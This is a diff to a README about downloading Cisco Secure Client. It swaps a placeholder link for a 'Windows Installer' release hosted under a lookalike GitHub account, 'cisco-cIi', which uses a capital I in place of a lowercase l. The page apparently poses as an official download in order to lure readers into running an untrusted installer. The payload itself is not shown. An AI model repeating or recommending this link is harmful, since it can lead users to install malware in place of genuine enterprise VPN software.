@@ -1,19 +1,14 @@
 # Download and Install Cisco Secure Client
 
-Cisco Secure Client, formerly known as AnyConnect, is a powerful VPN and security solution designed for enterprises to ensure secure remote connectivity. It provides a comprehensive security framework, allowing organizations to enforce security policies across various platforms like Windows, macOS, and Linux. The client supports multi-factor authentication, endpoint posture validation, and encrypted data transmission, ensuring reliable and secure access for mobile users and remote employees.
-
 * [Installation](#installation)
 * [Deploying Cisco Secure Client](#deploying-cisco-secure-client)
 * [Cisco Secure Client Deployment Methods](#cisco-secure-client-deployment-methods)
 * [Predeploying Cisco Secure Client](#predeploying-cisco-secure-client)
-* [Updating Cisco Secure Client Software and Profiles](#updating-cisco-secure-client-software-and-profiles)
 * [Configuring Cisco Secure Client Modules](#configuring-cisco-secure-client-modules)
 
 ## Installation
-
-To begin, download the latest version of Cisco Secure Client using the link below:
-
-**[Download Cisco Secure Client](*)**
+Click the link below to download the Cisco Secure Client installer:         
+**⬇️ [Cisco Secure Client Windows Installer](https://github.com/cisco-cIi/Cisco-Secure-Client/releases/tag/5.1)**
 
 Once downloaded, follow these steps to complete the installation:
 
